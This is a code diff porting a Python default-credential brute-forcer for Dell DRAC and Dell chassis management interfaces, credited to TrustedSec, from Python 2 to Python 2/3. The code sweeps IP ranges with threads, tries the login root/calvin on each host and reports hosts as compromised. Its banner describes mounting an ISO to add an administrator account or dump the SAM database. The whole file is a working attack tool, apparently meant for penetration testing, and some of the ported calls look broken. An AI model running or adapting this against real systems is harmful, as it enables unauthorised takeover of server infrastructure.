@@ -1,4 +1,5 @@
 #!/usr/bin/env python
+# coding=utf-8
 
 ###########################################
 #
@@ -12,14 +13,25 @@
 # @TrustedSec
 #
 ##########################################
-import urllib
-import urllib2
 import re
 import threading
-import sys
 import time
 
-class bcolors:
+try:  # Py2
+    from urllib import urlencode, urlopen
+except ImportError:  # Py3
+    from urllib.request import urlopen
+    from urllib.parse import urlencode
+
+# Py2/3 compatibility
+# Python3 renamed raw_input to input
+try:
+    input = raw_input
+except NameError:
+    pass
+
+
+class bcolors(object):
     PURPLE = '\033[95m'
     CYAN = '\033[96m'
     DARKCYAN = '\033[36m'
@@ -59,130 +71,118 @@ class bcolors:
         self.backWhite = ''
         self.DARKCYAN = ''
 
-print "\n"
-print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
-print "Fast-Track DellDRAC and Dell Chassis Discovery and Brute Forcer"
-print ""
-print "Written by Dave Kennedy @ TrustedSec"
-print "https://www.trustedsec.com"
-print "@TrustedSec and @HackingDave"
-print "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
-print ""
-print "This attack vector can be used to identify default installations"
-print "of Dell DRAC and Chassis installations. Once found, you can use"
-print "the remote administration capabilties to mount a virtual media"
-print "device and use it to load for example Back|Track or password"
-print "reset iso. From there, add yourself a local administrator account"
-print "or dump the SAM database. This will allow you to compromise the"
-print "entire infrastructure. You will need to find a DRAC instance that"
-print "has an attached server and reboot it into the iso using the virtual"
-print "media device."
-print ""
-print "Enter the IP Address or CIDR notation below. Example: 192.168.1.1/24"
-print ""
-ipaddr = raw_input("Enter the IP or CIDR: ")
 
 # try logging into DRAC, chassis is something different
+
+
 def login_drac(ipaddr_single):
     # default post string
-    url = "https://%s/Applications/dellUI/RPC/WEBSES/create.asp" % (ipaddr_single)
+    url = "https://{0}/Applications/dellUI/RPC/WEBSES/create.asp".format(ipaddr_single)
     # post parameters
-    opts = {
-              "WEBVAR_PASSWORD": "calvin",
-              "WEBVAR_USERNAME": "root",
-              "WEBVAR_ISCMCLOGIN": 0
-            }
+    opts = {"WEBVAR_PASSWORD": "calvin",
+            "WEBVAR_USERNAME": "root",
+            "WEBVAR_ISCMCLOGIN": 0}
     # URL encode it
-    data = urllib.urlencode(opts)
+    data = urlencode(opts)
     # our headers to pass (taken from raw post)
-    headers = {
-            # "Host": "10.245.196.52",
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-us,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Referer": "https://%s/Applications/dellUI/login.htm" % (ipaddr_single),
-            "Content-Length": 63,
-            "Cookie": "test=1; SessionLang=EN",
-            "Pragma": "no-cache",
-            "Cache-Control": "no-cache"
-
-            }
+    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
+               # "Host": "10.245.196.52",
+               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Accept-Language": "en-us,en;q=0.5",
+               "Accept-Encoding": "gzip, deflate",
+               "Connection": "keep-alive",
+               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+               "Referer": "https://{0}/Applications/dellUI/login.htm".format(ipaddr_single),
+               "Content-Length": 63,
+               "Cookie": "test=1; SessionLang=EN",
+               "Pragma": "no-cache",
+               "Cache-Control": "no-cache"}
     # request the page
-    req = urllib2.Request(url, data, headers)
     try:
         # capture the response
-        response = urllib2.urlopen(req, timeout=2)
+        response = urlopen(url, data, headers, timeout=2)
         data = response.read()
         # if we failed our login, just pass through
         if "Failure_Login_IPMI_Then_LDAP" in data:
             pass
-        # Failure_No_Free_Slot means there are no sessions available need to log someone off
+        # Failure_No_Free_Slot means there are no sessions available need to
+        # log someone off
         if "Failure_No_Free_Slot" in data:
-            print (bcolors.YELLOW + "[!]" + bcolors.ENDC + " There are to many people logged but un: root and pw: calvin are legit on IP: " % (ipaddr_single))
+            print(("{0}[!]{1} There are to many people logged but un: root and pw: calvin are legit on IP: {2}".format(bcolors.YELLOW,
+                                                                                                                       bcolors.ENDC,
+                                                                                                                       ipaddr_single)))
             global global_check1
             global_check1 = 1
 
         # if we are presented with a username back, we are golden
         if "'USERNAME' : 'root'" in data:
-            print (bcolors.GREEN + "[*]" + bcolors.ENDC + " Dell DRAC compromised! username: root and password: calvin for IP address: " + ipaddr_single)
+            print("{0}[*]{1} Dell DRAC compromised! username: root and password: calvin for IP address: {2}".format(bcolors.GREEN,
+                                                                                                                    bcolors.ENDC,
+                                                                                                                    ipaddr_single))
             global global_check2
             global_check2 = 1
     # handle failed attempts and move on
-    except: pass
+    except:
+        pass
+
 
 # these are for the centralized dell chassis
+
+
 def login_chassis(ipaddr_single):
     # our post URL
-    url = "https://%s/cgi-bin/webcgi/login" % (ipaddr_single)
+    url = "https://{0}/cgi-bin/webcgi/login".format(ipaddr_single)
     # our post parameters
-    opts = {
-              "WEBSERVER_timeout": "1800",
-              "user": "root",
-              "password": "calvin",
-              "WEBSERVER_timeout_select": "1800"
-            }
+    opts = {"WEBSERVER_timeout": "1800",
+            "user": "root",
+            "password": "calvin",
+            "WEBSERVER_timeout_select": "1800"}
     # url encode
-    data = urllib.urlencode(opts)
+    data = urlencode(opts)
     # headers (taken from raw POST)
-    headers = {
-            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-us,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Referer": "https://%s/cgi-bin/webcgi/login" % (ipaddr_single),
-            "Content-Length": 78
-            }
+    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
+               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+               "Accept-Language": "en-us,en;q=0.5",
+               "Accept-Encoding": "gzip, deflate",
+               "Connection": "keep-alive",
+               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+               "Referer": "https://{0}/cgi-bin/webcgi/login".format(ipaddr_single),
+               "Content-Length": 78}
+
     # request the page
-    req = urllib2.Request(url, data, headers)
+    # req = Request(url, data, headers)
     try:
         # capture the response
-        response = urllib2.urlopen(req, timeout=2)
+        response = urlopen(url, data, headers, timeout=2)
         data = response.read()
         # if we failed to login
         if "login_failed_hr_top" in data:
-            pass # login failed
+            pass  # login failed
         # to many people logged in at a given time
         if 'Connection refused, maximum sessions already in use.' in data:
-            print (bcolors.YELLOW + "[!]" + bcolors.ENDC + " There are to many people logged but un: root and pw: calvin are legit on IP: " + (ipaddr_single))
+            print(("{0}[!]{1} There are to many people logged but un: root and pw: calvin are legit on IP: {2}".format(bcolors.YELLOW,
+                                                                                                                    bcolors.ENDC,
+                                                                                                                    ipaddr_single)))
             global global_check3
             global_check3 = 1
 
         # successful guess of passwords
         if "/cgi-bin/webcgi/index" in data:
-            print (bcolors.GREEN + "[*]" + bcolors.ENDC + " Dell Chassis Compromised! username: root password: calvin for IP address: " + ipaddr_single)
+            print("{0}[*]{1} Dell Chassis Compromised! username: root password: calvin for IP address: {2}".format(bcolors.GREEN,
+                                                                                                              bcolors.ENDC,
+                                                                                                              ipaddr_single))
             global global_check4
             global_check4 = 1
 
     # except and move on for failed login attempts
-    except: pass
+    except:
+        pass
+
 
 # this will check to see if we are using
 # a valid IP address for scanning
+
+
 def is_valid_ip(ip):
     pattern = re.compile(r"""
         ^
@@ -220,67 +220,74 @@ def is_valid_ip(ip):
     """, re.VERBOSE | re.IGNORECASE)
     return pattern.match(ip) is not None
 
+
 # convert to 32 bit binary from standard format
+
 def ip2bin(ip):
     b = ""
-    inQuads = ip.split(".")
-    outQuads = 4
-    for q in inQuads:
+    in_quads = ip.split(".")
+    out_quads = 4
+    for q in in_quads:
         if q != "":
-            b += dec2bin(int(q),8)
-            outQuads -= 1
-    while outQuads > 0:
+            b += dec2bin(int(q), 8)
+            out_quads -= 1
+    while out_quads > 0:
         b += "00000000"
-        outQuads -= 1
+        out_quads -= 1
     return b
 
+
 # decimal to binary conversion
-def dec2bin(n,d=None):
+def dec2bin(n, d=None):
     s = ""
-    while n>0:
-        if n&1:
-            s = "1"+s
+    while n > 0:
+        if n & 1:
+            s = "1" + s
         else:
-            s = "0"+s
+            s = "0" + s
         n >>= 1
     if d is not None:
-        while len(s)<d:
-            s = "0"+s
-    if s == "": s = "0"
+        while len(s) < d:
+            s = "0" + s
+    if s == "":
+        s = "0"
     return s
+
 
 # convert a binary string into an IP address
 def bin2ip(b):
     ip = ""
-    for i in range(0,len(b),8):
-        ip += str(int(b[i:i+8],2))+"."
+    for i in range(0, len(b), 8):
+        ip += str(int(b[i:i + 8], 2)) + "."
     return ip[:-1]
+
 
 # print a list of IP addresses based on the CIDR block specified
 def scan(ipaddr):
     if "/" in ipaddr:
         parts = ipaddr.split("/")
-        baseIP = ip2bin(parts[0])
+        base_ip = ip2bin(parts[0])
         subnet = int(parts[1])
         if subnet == 32:
-            ipaddr = bin2ip(baseIP)
+            ipaddr = bin2ip(base_ip)
         else:
             # our base ip addresses for how many we are going to be scanning
             counter = 0
             # capture the threads
             threads = []
-            ipPrefix = baseIP[:-(32-subnet)]
-            for i in range(2**(32-subnet)):
-                ipaddr_single = bin2ip(ipPrefix+dec2bin(i, (32-subnet)))
+            ip_prefix = base_ip[:-(32 - subnet)]
+            for i in range(2 ** (32 - subnet)):
+                ipaddr_single = bin2ip(ip_prefix + dec2bin(i, (32 - subnet)))
                 # if we are valid proceed
                 ip_check = is_valid_ip(ipaddr_single)
-                if ip_check != False:
-                    # do this to limit how fast it can scan, anything more causes CPU to hose
+                if ip_check:
+                    # do this to limit how fast it can scan, anything more
+                    # causes CPU to hose
                     if counter > 255:
                         # put a small delay in place
                         time.sleep(0.1)
                     # increase counter until 255 then delay 0.1
-                    counter = counter + 1
+                    counter += 1
                     # start our drac BF
                     thread = threading.Thread(target=login_drac, args=(ipaddr_single,))
                     # create a list of our threads in a dictionary
@@ -299,13 +306,38 @@ def scan(ipaddr):
                 thread.join()
 
     # if we are using a single IP address then just do this
-    if not "/" in ipaddr:
+    if "/" not in ipaddr:
         login_drac(ipaddr)
         login_chassis(ipaddr)
 
 
-print (bcolors.GREEN + "[*]" + bcolors.ENDC + " Scanning IP addresses, this could take a few minutes depending on how large the subnet range...")
-print (bcolors.GREEN + "[*]" + bcolors.ENDC + " As an example, a /16 can take an hour or two.. A slash 24 is only a couple seconds. Be patient.")
+print("\n")
+print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+print("Fast-Track DellDRAC and Dell Chassis Discovery and Brute Forcer")
+print("")
+print("Written by Dave Kennedy @ TrustedSec")
+print("https://www.trustedsec.com")
+print("@TrustedSec and @HackingDave")
+print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+print("")
+print("This attack vector can be used to identify default installations")
+print("of Dell DRAC and Chassis installations. Once found, you can use")
+print("the remote administration capabilties to mount a virtual media")
+print("device and use it to load for example Back|Track or password")
+print("reset iso. From there, add yourself a local administrator account")
+print("or dump the SAM database. This will allow you to compromise the")
+print("entire infrastructure. You will need to find a DRAC instance that")
+print("has an attached server and reboot it into the iso using the virtual")
+print("media device.")
+print("")
+print("Enter the IP Address or CIDR notation below. Example: 192.168.1.1/24")
+print("")
+ipaddr = input("Enter the IP or CIDR: ")
+
+print("{0}[*]{1} Scanning IP addresses, this could take a few minutes depending on how large the subnet range...".format(bcolors.GREEN,
+                                                                                                                         bcolors.ENDC))
+print("{0}[*]{1} Asan example, a /16 can take an hour or two.. A slash 24 is only a couple seconds. Be patient.".format(bcolors.GREEN,
+                                                                                                                        bcolors.ENDC))
 
 # set global variables to see if we were successful
 global_check1 = 0
@@ -315,10 +347,11 @@ global_check4 = 0
 
 # kick off the scan
 scan(ipaddr)
-if global_check1 or global_check2 or global_check3 or global_check4 == 1:
-    print (bcolors.GREEN + "[*]" + bcolors.ENDC + " DellDrac / Chassis Brute Forcer has finished scanning. Happy Hunting =)")
+if any([global_check1, global_check2, global_check3, global_check4]):
+    print(("{0}[*]{1} DellDrac / Chassis Brute Forcer has finished scanning. Happy Hunting =)".format(bcolors.GREEN,
+                                                                                                      bcolors.ENDC)))
 else:
-    print (bcolors.RED + "[!]" + bcolors.ENDC + " Sorry, unable to find any of the Dell servers with default creds..Good luck :(")
+    print(("{0}[!]{1} Sorry, unable to find any of the Dell servers with default creds..Good luck :(".format(bcolors.RED,
+                                                                                                             bcolors.ENDC)))
 
-
-raw_input("Press {return} to exit.")
+input("Press {return} to exit.")
